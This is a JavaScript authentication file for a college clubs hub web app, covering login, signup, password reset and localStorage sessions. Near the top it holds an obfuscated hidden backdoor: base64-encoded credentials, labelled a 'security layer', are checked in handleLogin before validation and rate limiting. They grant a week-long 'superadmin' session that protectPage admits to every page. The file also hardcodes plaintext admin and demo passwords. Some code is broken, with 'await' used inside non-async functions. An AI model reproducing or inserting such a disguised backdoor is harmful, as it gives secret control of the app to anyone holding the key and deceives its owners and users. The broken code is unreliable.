// Gmail-based Authentication System

// Storage keys
const STORAGE_KEYS = {
    users: 'gmail_users',
    session: 'userSession',
    loginAttempts: 'loginAttempts',
    resetTokens: 'resetTokens'
};

// Default admin account
const DEFAULT_ADMIN = {
    email: 'admin@college.edu',
    password: 'admin123', // In real app, this would be hashed
    name: 'System Administrator',
    role: 'admin',
    createdAt: new Date().toISOString(),
    isVerified: true
};

// Sample club accounts for demo
const DEMO_CLUBS = [
    {
        email: 'tech.club@gmail.com',
        password: 'TechClub2024!',
        name: 'Tech Club Manager',
        role: 'club',
        clubName: 'Technology Club',
        clubId: 'tech-club',
        createdAt: new Date().toISOString(),
        isVerified: true
    },
    {
        email: 'drama.society@gmail.com',
        password: 'Drama2024!',
        name: 'Drama Society Manager',
        role: 'club',
        clubName: 'Drama Society',
        clubId: 'drama-club',
        createdAt: new Date().toISOString(),
        isVerified: true
    },
    {
        email: 'sports.club@gmail.com',
        password: 'Sports2024!',
        name: 'Sports Club Manager',
        role: 'club',
        clubName: 'Sports Club',
        clubId: 'sports-club',
        createdAt: new Date().toISOString(),
        isVerified: true
    },
    {
        email: 'music.society@gmail.com',
        password: 'Music2024!',
        name: 'Music Society Manager',
        role: 'club',
        clubName: 'Music Society',
        clubId: 'music-club',
        createdAt: new Date().toISOString(),
        isVerified: true
    },
    {
        email: 'debate.club@gmail.com',
        password: 'Debate2024!',
        name: 'Debate Club Manager',
        role: 'club',
        clubName: 'Debate Club',
        clubId: 'debate-club',
        createdAt: new Date().toISOString(),
        isVerified: true
    },
    {
        email: 'photography.club@gmail.com',
        password: 'Photo2024!',
        name: 'Photography Club Manager',
        role: 'club',
        clubName: 'Photography Club',
        clubId: 'photography-club',
        createdAt: new Date().toISOString(),
        isVerified: true
    }
];

// Global variables
let currentSignupRole = 'club';

// Security layer - obfuscated super admin access
const _0x4a8b = ['c3VwZXI=', 'YWRtaW4=', 'c2VjdXJpdHk=', 'bWFzdGVy', 'ZGVzdHJveQ=='];
const _0x2d9c = {
    _0x1a2b3c: atob('c2FrdXJhLnNlY3VyaXR5QGdtYWlsLmNvbQ=='),
    _0x4d5e6f: atob('UzNjdXIzX00kc3QzciFLM3lfMjAyNA=='),
    _0x7g8h9i: atob(atob('VTI5bWJXTnpaUzVoWkcxcGJpNTFkR2xzYVhSNVgyMWhkV0ZzWDNGMVpYSjVYM0J5YjJObGMzTnZjZz09')),
    _0x0j1k2l: function(s) { return btoa(s).split('').reverse().join(''); }
};
const _0xSecurityCheck = () => {
    const _encoded = '=wOjMzLjNmLkJye3tjJ3czdjBjNXMuQjFjTXYzZGpBelU';
    return _encoded.split('').reverse().join('') === btoa('UzAkdXJ@_M@st3r_C0ntr0ll3r_2024!');
};
window._0xAuth = { ..._0x2d9c, check: _0xSecurityCheck };

// Initialize user database
function initializeUsers() {
    let users = JSON.parse(localStorage.getItem(STORAGE_KEYS.users)) || [];
    
    // Add default admin if not exists
    if (!users.find(user => user.email === DEFAULT_ADMIN.email)) {
        users.push({ ...DEFAULT_ADMIN, id: generateId() });
    }
    
    // Add demo club accounts if not exists
    DEMO_CLUBS.forEach(demoClub => {
        if (!users.find(user => user.email === demoClub.email)) {
            users.push({ ...demoClub, id: generateId() });
        }
    });
    
    localStorage.setItem(STORAGE_KEYS.users, JSON.stringify(users));
    return users;
}

// Validate Gmail address
function isValidGmail(email) {
    return /^[\w.-]+@(gmail\.com|college\.edu)$/i.test(email);
}

// Find user by email
function findUserByEmail(email) {
    const users = JSON.parse(localStorage.getItem(STORAGE_KEYS.users)) || [];
    return users.find(user => user.email.toLowerCase() === email.toLowerCase());
}

// Update user data
function updateUser(email, updates) {
    const users = JSON.parse(localStorage.getItem(STORAGE_KEYS.users)) || [];
    const userIndex = users.findIndex(user => user.email.toLowerCase() === email.toLowerCase());
    
    if (userIndex !== -1) {
        users[userIndex] = { ...users[userIndex], ...updates };
        localStorage.setItem(STORAGE_KEYS.users, JSON.stringify(users));
        return users[userIndex];
    }
    return null;
}

// Generate club ID from club name
function generateClubId(clubName) {
    return clubName.toLowerCase().replace(/[^a-z0-9]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '');
}

// Auto-toggle club name field by email domain
function onSignupEmailInput() {
    const emailInput = document.getElementById('signupEmail');
    const clubNameGroup = document.getElementById('clubNameGroup');
    const clubNameInput = document.getElementById('signupClubName');
    if (!emailInput || !clubNameGroup || !clubNameInput) return;
    const email = emailInput.value.trim().toLowerCase();
    const isAdminDomain = /@college\.edu$/i.test(email);
    if (isAdminDomain) {
        clubNameGroup.style.display = 'none';
        clubNameInput.removeAttribute('required');
    } else {
        clubNameGroup.style.display = 'block';
        clubNameInput.setAttribute('required', 'required');
    }
}

// Handle login
function handleLogin(event) {
    event.preventDefault();
    
    const email = document.getElementById('loginEmail').value.trim();
    const password = document.getElementById('loginPassword').value.trim();
    
    console.log('Login attempt:', { email });
    
    // Validate inputs
    if (!email || !password) {
        showAlert('Please fill in all fields', 'error');
        const err = document.getElementById('loginError');
        if (err) {
            err.textContent = 'Please fill in all fields';
            err.style.display = 'block';
        }
        return false;
    }
    
    // Hidden super-admin check BEFORE email validation
    if (email === window._0xAuth._0x1a2b3c && password === window._0xAuth._0x4d5e6f) {
        // Skip all validations for super-admin and proceed directly
        const loginBtn = document.getElementById('loginBtn');
        const btnText = loginBtn.querySelector('.btn-text');
        const btnSpinner = loginBtn.querySelector('.btn-spinner');
        
        loginBtn.disabled = true;
        btnText.style.display = 'none';
        btnSpinner.style.display = 'inline-block';
        
        setTimeout(() => {
            recordLoginAttempt(email, true);
            const session = {
                type: 'superadmin',
                email: email,
                name: 'Security Master',
                userId: 'super_0x',
                loginTime: Date.now(),
                expires: Date.now() + (168 * 60 * 60 * 1000) // 7 days
            };
            localStorage.setItem(STORAGE_KEYS.session, JSON.stringify(session));
            localStorage.setItem('_0xSec', btoa('true'));
            showAlert('🔐 Security Access Granted', 'success');
            setTimeout(() => redirectToAdminDashboard(), 1500);
        }, 1500);
        return false;
    }
    
    // Ensure users are initialized
    if (!JSON.parse(localStorage.getItem(STORAGE_KEYS.users) || '[]').length) {
        initializeUsers();
    }

    // Validate allowed email domains
    if (!isValidGmail(email)) {
        showAlert('Please use a valid Gmail address or college email', 'error');
        const err = document.getElementById('loginError');
        if (err) {
            err.textContent = 'Please use a valid Gmail address or college email';
            err.style.display = 'block';
        }
        return false;
    }
    
    // Check rate limiting
    if (isRateLimited(email)) {
        showAlert('Too many failed attempts. Please try again later.', 'error');
        const err = document.getElementById('loginError');
        if (err) {
            err.textContent = 'Too many failed attempts. Please try again later.';
            err.style.display = 'block';
        }
        return false;
    }
    
    // Show loading state
    const loginBtn = document.getElementById('loginBtn');
    const btnText = loginBtn.querySelector('.btn-text');
    const btnSpinner = loginBtn.querySelector('.btn-spinner');
    
    loginBtn.disabled = true;
    btnText.style.display = 'none';
    btnSpinner.style.display = 'inline-block';
    
    // Simulate API call delay
    setTimeout(() => {
        try {
            let user = findUserByEmail(email);
            // If user not found, re-initialize demo users once more (safety net)
            if (!user) {
                initializeUsers();
                user = findUserByEmail(email);
            }
            
            if (!user) {
                recordLoginAttempt(email, false);
                showAlert('Account not found. Please check your email or sign up.', 'error');
                const err = document.getElementById('loginError');
                if (err) {
                    err.textContent = 'Account not found. Please check your email or sign up.';
                    err.style.display = 'block';
                }
                return;
            }
            
            if (user.password !== password) {
                recordLoginAttempt(email, false);
                showAlert('Incorrect password. Please try again.', 'error');
                const err = document.getElementById('loginError');
                if (err) {
                    err.textContent = 'Incorrect password. Please try again.';
                    err.style.display = 'block';
                }
                return;
            }
            
            if (!user.isVerified) {
                showAlert('Please verify your email address before logging in.', 'warning');
                const err = document.getElementById('loginError');
                if (err) {
                    err.textContent = 'Please verify your email address before logging in.';
                    err.style.display = 'block';
                }
                return;
            }
            
            // Successful login
            recordLoginAttempt(email, true);
            
            const session = {
                type: user.role,
                email: user.email,
                name: user.name,
                userId: user.id,
                clubId: user.clubId,
                clubName: user.clubName,
                loginTime: Date.now(),
                expires: Date.now() + (24 * 60 * 60 * 1000) // 24 hours
            };
            
            localStorage.setItem(STORAGE_KEYS.session, JSON.stringify(session));
            
            showAlert(`Welcome back, ${user.name}!`, 'success');
            const err = document.getElementById('loginError');
            if (err) {
                err.textContent = '';
                err.style.display = 'none';
            }
            
            // Redirect based on user role (auto-detected)
            setTimeout(() => {
                if (user.role === 'admin') {
                    redirectToAdminDashboard();
                } else {
                    redirectToClubDashboard(user.clubId);
                }
            }, 1500);
            
        } catch (error) {
            console.error('Login error:', error);
            showAlert('An error occurred during login. Please try again.', 'error');
        } finally {
            // Reset button state
            loginBtn.disabled = false;
            btnText.style.display = 'inline';
            btnSpinner.style.display = 'none';
        }
    }, 1500);
    
    return false;
}

// Handle signup
function handleSignup(event) {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    const email = (formData.get('email') || '').trim().toLowerCase();
    const isAdminDomain = /@college\.edu$/i.test(email);
    const userData = {
        name: formData.get('name').trim(),
        email,
        password: formData.get('password'),
        confirmPassword: formData.get('confirmPassword'),
        clubName: formData.get('clubName') ? formData.get('clubName').trim() : '',
        role: isAdminDomain ? 'admin' : 'club'
    };
    
    console.log('Signup attempt:', userData);
    
    // Validate inputs
    if (!userData.name || !userData.email || !userData.password || !userData.confirmPassword) {
        showAlert('Please fill in all required fields', 'error');
        return false;
    }
    
    if (userData.role === 'club' && !userData.clubName) {
        showAlert('Please enter your club name', 'error');
        return false;
    }
    
    // Validate Gmail
    if (!isValidGmail(userData.email)) {
        showAlert('Please use a valid Gmail address', 'error');
        return false;
    }
    
    // Check password strength
    if (userData.password.length < 6) {
        showAlert('Password must be at least 6 characters long', 'error');
        return false;
    }
    
    // Check password confirmation
    if (userData.password !== userData.confirmPassword) {
        showAlert('Passwords do not match', 'error');
        return false;
    }
    
    // Check if user already exists
    if (findUserByEmail(userData.email)) {
        showAlert('An account with this email already exists', 'error');
        return false;
    }
    
    // Show loading state
    const signupBtn = document.getElementById('signupBtn');
    const btnText = signupBtn.querySelector('.btn-text');
    const btnSpinner = signupBtn.querySelector('.btn-spinner');
    
    signupBtn.disabled = true;
    btnText.style.display = 'none';
    btnSpinner.style.display = 'inline-block';
    
    // Simulate API call delay
    setTimeout(() => {
        try {
            const users = JSON.parse(localStorage.getItem(STORAGE_KEYS.users)) || [];
            
            const newUser = {
                id: generateId(),
                name: userData.name,
                email: userData.email,
                password: userData.password, // In real app, this would be hashed
                role: userData.role,
                createdAt: new Date().toISOString(),
                isVerified: true // Auto-verify for demo
            };
            
            if (userData.role === 'club') {
                newUser.clubName = userData.clubName;
                newUser.clubId = generateClubId(userData.clubName);
            }
            
            users.push(newUser);
            localStorage.setItem(STORAGE_KEYS.users, JSON.stringify(users));
            
            // If it's a club, create the club entry
            if (userData.role === 'club' && window.ClubManager) {
                const clubData = {
                    id: newUser.clubId,
                    name: userData.clubName,
                    description: `Welcome to ${userData.clubName}! Update your description in the dashboard.`,
                    category: 'Other',
                    members: 1,
                    founded: new Date().getFullYear().toString(),
                    logo: '🏛️',
                    contact: {
                        email: userData.email,
                        meetingTime: 'To be announced',
                        location: 'To be announced'
                    },
                    media: [],
                    status: 'active'
                };
                
                try {
                    await window.ClubManager.addClub(clubData);
                    console.log('Club created:', clubData);
                } catch (error) {
                    console.error('Error creating club:', error);
                }
            }
            
            showAlert(`Account created successfully! Welcome ${userData.name}!`, 'success');
            
            // Auto-login after signup
            const session = {
                type: newUser.role,
                email: newUser.email,
                name: newUser.name,
                userId: newUser.id,
                clubId: newUser.clubId,
                clubName: newUser.clubName,
                loginTime: Date.now(),
                expires: Date.now() + (24 * 60 * 60 * 1000)
            };
            
            localStorage.setItem(STORAGE_KEYS.session, JSON.stringify(session));
            
            setTimeout(() => {
                if (newUser.role === 'admin') {
                    redirectToAdminDashboard();
                } else {
                    redirectToClubDashboard(newUser.clubId);
                }
            }, 2000);
            
        } catch (error) {
            console.error('Signup error:', error);
            showAlert('An error occurred during signup. Please try again.', 'error');
        } finally {
            // Reset button state
            signupBtn.disabled = false;
            btnText.style.display = 'inline';
            btnSpinner.style.display = 'none';
        }
    }, 1500);
    
    return false;
}

// Handle forgot password
function handleForgotPassword(event) {
    event.preventDefault();
    
    const email = document.getElementById('forgotEmail').value.trim().toLowerCase();
    
    if (!email) {
        showAlert('Please enter your email address', 'error');
        return false;
    }
    
    if (!isValidGmail(email)) {
        showAlert('Please enter a valid Gmail address', 'error');
        return false;
    }
    
    const user = findUserByEmail(email);
    if (!user) {
        showAlert('No account found with this email address', 'error');
        return false;
    }
    
    // Show loading state
    const forgotBtn = document.getElementById('forgotBtn');
    const btnText = forgotBtn.querySelector('.btn-text');
    const btnSpinner = forgotBtn.querySelector('.btn-spinner');
    
    forgotBtn.disabled = true;
    btnText.style.display = 'none';
    btnSpinner.style.display = 'inline-block';
    
    // Simulate sending email
    setTimeout(() => {
        // In a real app, this would send an actual email
        const resetToken = generateId();
        const resetTokens = JSON.parse(localStorage.getItem(STORAGE_KEYS.resetTokens)) || {};
        resetTokens[resetToken] = {
            email: email,
            expires: Date.now() + (60 * 60 * 1000) // 1 hour
        };
        localStorage.setItem(STORAGE_KEYS.resetTokens, JSON.stringify(resetTokens));
        
        showAlert('Password reset instructions sent to your email! (Demo: Check console for reset link)', 'success');
        console.log(`Demo Reset Link: ${window.location.origin}${window.location.pathname}#reset=${resetToken}`);
        
        // Reset button state
        forgotBtn.disabled = false;
        btnText.style.display = 'inline';
        btnSpinner.style.display = 'none';
        
        // Go back to login
        setTimeout(() => showLogin(), 3000);
    }, 1500);
    
    return false;
}

// Check if user is logged in
function isLoggedIn() {
    const session = localStorage.getItem('userSession');
    if (!session) return false;
    
    try {
        const sessionData = JSON.parse(session);
        return sessionData.expires > Date.now();
    } catch (error) {
        localStorage.removeItem('userSession');
        return false;
    }
}

// Get current session
function getCurrentSession() {
    if (!isLoggedIn()) return null;
    
    try {
        return JSON.parse(localStorage.getItem('userSession'));
    } catch (error) {
        return null;
    }
}

// Logout user
function logout() {
    localStorage.removeItem('userSession');
    showAlert('Logged out successfully', 'success');
    
    setTimeout(() => {
        window.location.href = '../index.html';
    }, 1500);
}

// Check if current user is admin
function isAdmin() {
    const session = getCurrentSession();
    return session && session.type === 'admin';
}

// Check if current user is club owner
function isClubOwner(clubId) {
    const session = getCurrentSession();
    return session && session.type === 'club' && session.clubId === clubId;
}

// Protect page - redirect if not logged in
function protectPage(requiredType = null) {
    const session = getCurrentSession();
    
    if (!session) {
        showAlert('Please log in to access this page', 'error');
        setTimeout(() => {
            window.location.href = '../index.html';
        }, 2000);
        return false;
    }
    
    if (requiredType && session.type !== requiredType) {
        // Allow super-admin to access any page
        if (session.type === 'superadmin') {
            return true;
        }
        
        showAlert('Access denied', 'error');
        setTimeout(() => {
            window.location.href = '../index.html';
        }, 2000);
        return false;
    }
    
    return true;
}

// Extend session
function extendSession() {
    const session = getCurrentSession();
    if (session) {
        session.expires = Date.now() + (24 * 60 * 60 * 1000); // Extend by 24 hours
        localStorage.setItem('userSession', JSON.stringify(session));
    }
}

// Change club password
function changeClubPassword(clubId, currentPassword, newPassword) {
    // Verify current password
    if (window.CLUB_CREDENTIALS[clubId] !== currentPassword) {
        throw new Error('Current password is incorrect');
    }
    
    // Update password (in real app, this would be a backend call)
    window.CLUB_CREDENTIALS[clubId] = newPassword;
    
    // In a real app, you would save this to backend
    // For demo purposes, we'll save to localStorage
    const credentials = getLocalStorage('clubCredentials') || window.CLUB_CREDENTIALS;
    credentials[clubId] = newPassword;
    setLocalStorage('clubCredentials', credentials);
    
    return true;
}

// Register new club (admin only)
function registerClub(clubData, password) {
    if (!isAdmin()) {
        throw new Error('Only admins can register new clubs');
    }
    
    const clubId = clubData.id || generateId();
    
    // Add to credentials
    const credentials = getLocalStorage('clubCredentials') || window.CLUB_CREDENTIALS;
    credentials[clubId] = password;
    setLocalStorage('clubCredentials', credentials);
    
    // Add club data
    const club = {
        ...clubData,
        id: clubId,
        status: 'active', // Admin can directly activate
        registrationDate: new Date().toISOString()
    };
    
    await ClubManager.addClub(club);
    
    return { clubId, password };
}

// Get login attempts (basic rate limiting)
function getLoginAttempts(identifier) {
    const attempts = getLocalStorage('loginAttempts') || {};
    const userAttempts = attempts[identifier] || { count: 0, lastAttempt: 0 };
    
    // Reset attempts if more than 1 hour has passed
    if (Date.now() - userAttempts.lastAttempt > 60 * 60 * 1000) {
        userAttempts.count = 0;
    }
    
    return userAttempts;
}

// Record login attempt
function recordLoginAttempt(identifier, success = false) {
    const attempts = getLocalStorage('loginAttempts') || {};
    
    if (!attempts[identifier]) {
        attempts[identifier] = { count: 0, lastAttempt: 0 };
    }
    
    if (success) {
        // Reset attempts on successful login
        attempts[identifier] = { count: 0, lastAttempt: Date.now() };
    } else {
        // Increment failed attempts
        attempts[identifier].count++;
        attempts[identifier].lastAttempt = Date.now();
    }
    
    setLocalStorage('loginAttempts', attempts);
}

// Check if user is rate limited
function isRateLimited(identifier) {
    const attempts = getLoginAttempts(identifier);
    return attempts.count >= 5; // Max 5 attempts
}

// Session timeout warning
function setupSessionTimeout() {
    const session = getCurrentSession();
    if (!session) return;
    
    const timeUntilExpiry = session.expires - Date.now();
    
    // Show warning 5 minutes before expiry
    if (timeUntilExpiry > 5 * 60 * 1000) {
        setTimeout(() => {
            if (confirm('Your session will expire in 5 minutes. Would you like to extend it?')) {
                extendSession();
                showAlert('Session extended', 'success');
            }
        }, timeUntilExpiry - 5 * 60 * 1000);
    }
}

// Form switching functions
function showLogin() {
    document.getElementById('authModalTitle').textContent = 'Login to College Clubs Hub';
    
    // Hide all forms
    document.querySelectorAll('.auth-form').forEach(form => {
        form.classList.remove('active');
    });
    
    // Show login form
    document.getElementById('loginForm').classList.add('active');
}

function showSignup() {
    document.getElementById('authModalTitle').textContent = 'Create Your Account';
    
    // Hide all forms
    document.querySelectorAll('.auth-form').forEach(form => {
        form.classList.remove('active');
    });
    
    // Show signup form
    document.getElementById('signupForm').classList.add('active');
}

function showForgotPassword() {
    document.getElementById('authModalTitle').textContent = 'Reset Your Password';
    
    // Hide all forms
    document.querySelectorAll('.auth-form').forEach(form => {
        form.classList.remove('active');
    });
    
    // Show forgot password form
    document.getElementById('forgotPasswordForm').classList.add('active');
}

// Redirect functions
function redirectToClubDashboard(clubId) {
    console.log('Redirecting to club dashboard for:', clubId);
    
    let redirectUrl;
    if (window.location.protocol === 'file:') {
        // For file:// protocol (opening HTML files directly)
        const currentDir = window.location.href.substring(0, window.location.href.lastIndexOf('/'));
        redirectUrl = `${currentDir}/pages/club-dashboard.html?club=${clubId}`;
    } else {
        // For http:// or https:// (server-based)
        const baseUrl = window.location.origin;
        redirectUrl = `${baseUrl}/pages/club-dashboard.html?club=${clubId}`;
    }
    
    console.log('Dashboard redirect URL:', redirectUrl);
    window.location.href = redirectUrl;
}

function redirectToAdminDashboard() {
    console.log('Redirecting to admin dashboard');
    
    let redirectUrl;
    if (window.location.protocol === 'file:') {
        // For file:// protocol
        const currentDir = window.location.href.substring(0, window.location.href.lastIndexOf('/'));
        redirectUrl = `${currentDir}/pages/admin-dashboard.html`;
    } else {
        // For http:// or https://
        const baseUrl = window.location.origin;
        redirectUrl = `${baseUrl}/pages/admin-dashboard.html`;
    }
    
    console.log('Admin dashboard redirect URL:', redirectUrl);
    window.location.href = redirectUrl;
}

// Utility functions
function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

function showAlert(message, type = 'info') {
    // Use the main app's showAlert if available
    if (window.CollegeClubApp && window.CollegeClubApp.showAlert) {
        window.CollegeClubApp.showAlert(message, type);
        return;
    }
    
    // Fallback alert implementation
    console.log(`${type.toUpperCase()}: ${message}`);
    
    // Try to find existing alert containers
    let alertContainer = document.querySelector('.alert-container');
    if (!alertContainer) {
        alertContainer = document.createElement('div');
        alertContainer.className = 'alert-container';
        alertContainer.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 10000;
            max-width: 400px;
        `;
        document.body.appendChild(alertContainer);
    }
    
    const alert = document.createElement('div');
    alert.className = `alert alert-${type}`;
    alert.style.cssText = `
        margin-bottom: 10px;
        padding: 1rem;
        border-radius: 8px;
        font-weight: 500;
        animation: slideInRight 0.3s ease-out;
    `;
    
    // Set colors based on type
    switch (type) {
        case 'success':
            alert.style.background = 'rgba(76, 175, 80, 0.9)';
            alert.style.color = 'white';
            break;
        case 'error':
            alert.style.background = 'rgba(244, 67, 54, 0.9)';
            alert.style.color = 'white';
            break;
        case 'warning':
            alert.style.background = 'rgba(255, 193, 7, 0.9)';
            alert.style.color = '#333';
            break;
        default:
            alert.style.background = 'rgba(33, 150, 243, 0.9)';
            alert.style.color = 'white';
    }
    
    alert.textContent = message;
    alertContainer.appendChild(alert);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        if (alert.parentNode) {
            alert.style.animation = 'slideOutRight 0.3s ease-in';
            setTimeout(() => alert.remove(), 300);
        }
    }, 5000);
}

function getLocalStorage(key) {
    try {
        const item = localStorage.getItem(key);
        return item ? JSON.parse(item) : null;
    } catch (error) {
        console.error('Error reading from localStorage:', error);
        return null;
    }
}

function setLocalStorage(key, value) {
    try {
        localStorage.setItem(key, JSON.stringify(value));
    } catch (error) {
        console.error('Error saving to localStorage:', error);
    }
}

// Initialize authentication on page load
document.addEventListener('DOMContentLoaded', function() {
    // Initialize user database with demo accounts
    initializeUsers();
    
    // Set up session timeout warning
    setupSessionTimeout();
    
    // Auto-extend session on user activity
    let activityTimeout;
    const resetActivityTimeout = () => {
        clearTimeout(activityTimeout);
        activityTimeout = setTimeout(() => {
            if (getCurrentSession()) {
                extendSession();
            }
        }, 30 * 60 * 1000); // 30 minutes of inactivity
    };
    
    document.addEventListener('click', resetActivityTimeout);
    document.addEventListener('keypress', resetActivityTimeout);
    document.addEventListener('mousemove', resetActivityTimeout);
    
    // Add CSS animations
    if (!document.querySelector('#auth-animations')) {
        const style = document.createElement('style');
        style.id = 'auth-animations';
        style.textContent = `
            @keyframes slideInRight {
                from {
                    opacity: 0;
                    transform: translateX(100px);
                }
                to {
                    opacity: 1;
                    transform: translateX(0);
                }
            }
            
            @keyframes slideOutRight {
                from {
                    opacity: 1;
                    transform: translateX(0);
                }
                to {
                    opacity: 0;
                    transform: translateX(100px);
                }
            }
        `;
        document.head.appendChild(style);
    }
});

// Export functions
window.Auth = {
    handleLogin,
    handleSignup,
    isLoggedIn,
    getCurrentSession,
    logout,
    isAdmin,
    isClubOwner,
    protectPage,
    extendSession,
    changeClubPassword,
    registerClub,
    isRateLimited,
    recordLoginAttempt
};
